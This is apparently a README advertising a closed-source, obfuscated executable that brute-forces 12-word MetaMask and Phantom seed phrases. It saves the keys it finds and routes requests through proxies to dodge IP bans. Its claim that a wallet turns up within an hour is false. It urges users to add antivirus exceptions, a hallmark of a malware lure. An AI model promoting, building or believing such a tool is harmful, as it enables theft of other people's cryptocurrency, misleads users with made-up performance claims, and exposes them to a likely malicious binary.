> Disclaimer: This tool is intended for educational purposes and legitimate wallet recovery only. The developers are not liable for misuse. Always comply with local laws and ethical guidelines.

- A High-Speed Brute-Forcer Tool for Wallet Recovery

This Python-based tool efficiently brute-forces 12-word seed phrases (mnemonics) for MetaMask and Phantom wallets. It leverages multithreading and proxy support to accelerate the discovery process. Upon finding a valid seed, the program saves wallet details (address, private key, and seed phrase) to found_wallets.txt.

⚠️ Note:

Not open-source: Proprietary optimization methods are used.
Antivirus alerts: Rare false positives may occur due to code obfuscation and packaging.

:heavy_check_mark: Key Features

1) Multi-Wallet Support:
Compatible with MetaMask and Phantom wallets.

2) Multithreading:
Processes multiple seed combinations concurrently (user-defined threads).

3) Proxy Integration:
Route requests through proxies to avoid IP bans (HTTP/SOCKS supported).

4) Automated Saving:
Outputs discovered wallets to found_wallets.txt in real-time.

:pencil: Usage Instructions

1) Run the executable.

2) Select a wallet: Choose MetaMask or Phantom (or both).

3) Configure Threads.

4) Proxy Setup (Optional):
Enable the "Use Proxy" checkbox.
Enter your proxy URL (e.g. http://user:pass@ip:port).

5) Click Start and wait. The process may take hours/days.

⏳ Typical Workflow:

First wallet found in 40–50 minutes (as demonstrated in the YouTube video).

Do not interrupt the process—results are saved live.

:point_down: Important Notes

1) Patience Required:
Brute-forcing 12-word seeds is computationally intensive. Expect extended runtimes.

2) Hardware Recommendations:
Use a machine with high CPU cores for optimal multithreading.

3) Proxy Advisory:
Proxies prevent rate-limiting but may slow down requests. Use reliable providers.

4) Security Warnings:
Use responsibly: Only test wallets you own.
Antivirus: Add exceptions if false positives occur.

📌 Final Advice:

Let the tool run uninterrupted.
Verify found_wallets.txt periodically.
Never share recovered seeds privately!

Good luck! 🚀
